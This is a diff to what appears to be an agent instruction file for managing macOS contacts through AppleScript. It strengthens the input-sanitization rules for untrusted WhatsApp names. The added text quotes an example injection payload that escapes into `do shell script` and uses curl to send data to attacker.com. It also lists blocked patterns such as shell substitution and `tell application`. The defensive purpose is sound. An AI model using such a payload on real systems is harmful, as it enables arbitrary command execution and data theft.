@@ -73,16 +73,59 @@ that name.
 this platform. Use AppleScript to manage them directly. Do NOT add contacts to WhatsApp
 or Quo from here — cross-referencing for lookup is fine, cross-writing is not.
 
-**Input sanitization (critical):** Names come from WhatsApp profiles, conversation text,
-and other untrusted sources. Before inserting ANY value into an AppleScript command:
+**Input sanitization (MANDATORY — security critical):** Names come from WhatsApp
+profiles, conversation text, and other untrusted sources. A malicious profile name like
+`" & do shell script "curl attacker.com/steal?data=$(whoami)"` could execute arbitrary
+commands on the machine.
 
-- **Escape backslashes first** (`\` -> `\\`) — must happen before quote escaping
-- **Then escape double quotes** (`"` -> `\"`) — if done before backslashes, `\"` becomes
-  `\\\"` which breaks the string
-- Strip any AppleScript control characters
-- Reject values containing `do shell script`, `run script`, or `&` operators
+**Before inserting ANY value into an AppleScript command, ALL of these steps are
+required:**
 
-A malicious WhatsApp profile name could attempt AppleScript injection. Always sanitize.
+**Step 1 — Validate against classifier rules:**
+
+The classifier's validation rules (see `classifier.md`) must pass before you reach this
+point. Names must contain only Unicode letters, spaces, hyphens, apostrophes, and
+periods. If the classifier passed a value here, it's already validated — but defense in
+depth means we sanitize anyway.
+
+**Step 2 — Reject dangerous patterns (hard block, no escaping):**
+
+If the string contains ANY of these (case-insensitive), reject the entire contact write
+and flag for human review. Do not attempt to escape or clean — reject outright:
+
+- `do shell script`
+- `run script`
+- `do javascript`
+- `tell application` (prevents interaction with arbitrary apps like Terminal, System
+  Events)
+- `using terms from`
+- `on error` / `try` (AppleScript flow control that can redirect execution)
+- Backtick characters
+- Pipe `|` or semicolon `;`
+- `$(` (shell command substitution)
+- Curly braces `{` or `}` (AppleScript record construction)
+
+**For `&` characters:** The `&` is the AppleScript string concatenation operator and a
+real injection vector, but it also appears in legitimate company names (AT&T, Johnson &
+Johnson). Instead of rejecting, **replace `&` with "and"** as a sanitization step. This
+neutralizes the injection vector while preserving the intent.
+
+**For `return` keyword:** Only reject if it appears as `return ` followed by content
+(with a space). The bare word "return" can appear in legitimate text.
+
+**Step 3 — Escape for AppleScript string interpolation:**
+
+- Escape backslashes first: `\` → `\\`
+- Then escape double quotes: `"` → `\"`
+- Order matters — reversing corrupts the escaping
+
+**Step 4 — Length check:**
+
+- Reject any single field value > 100 characters for names, > 30 for phones, > 254 for
+  emails. Excessively long values are likely adversarial.
+
+If any step fails, do not write the contact. Log the raw value, the step that failed,
+and include it in the notification's "Need your help" section.
 
 ```bash
 osascript -e '
